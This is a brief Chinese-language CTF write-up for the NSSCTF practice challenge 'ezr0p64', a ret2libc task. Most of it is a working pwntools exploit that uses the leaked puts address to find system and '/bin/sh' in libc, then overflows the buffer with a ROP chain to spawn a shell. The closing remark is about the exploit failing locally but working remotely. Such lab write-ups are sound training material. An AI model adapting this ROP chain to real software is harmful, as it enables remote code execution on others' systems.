[[HNCTF 2022 Week1]ezr0p64 | NSSCTF](https://www.nssctf.cn/problem/2931)
![[Pasted image 20240901180459.png]]
也是一道ret2libc的题目，不过他已经给出了puts函数的真实地址以及libc版本，很好做
exp:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./ezrop64')
libc = ELF('./libc.so.6')
local = True
if local:
    p = process('./ezrop64')
    # pwnlib.gdb.attach(p, 'b *0x4011DD')
else:
    p = remote('node5.anna.nssctf.cn', 25505)
ret = 0x40101a
rdi = 0x4012a3

p.recvuntil(b'Easyrop.\nGift :')
puts_addr = int(p.recvuntil('\n', drop=True), 16)
log.success('puts real addr: ' + hex(puts_addr))

base = puts_addr - libc.symbols['puts']
system_addr = base + libc.symbols['system']
binsh_addr = base + next(libc.search('/bin/sh'))

log.success('system addr: ' + hex(system_addr))
log.success('binsh addr: ' + hex(binsh_addr))

payload = b'A' * (0x100 + 8) + p64(ret) + p64(rdi) + p64(binsh_addr) + p64(system_addr)
p.recvuntil(b'rop.')
p.sendline(payload)
p.interactive()
```
PS:不是哥们，都直接把`puts`的地址打出来的，本地的wsl还是跑不通，还好我直接试了一下远程，以后和ret2libc有关的题目我是不是都得本地远程一起试试。
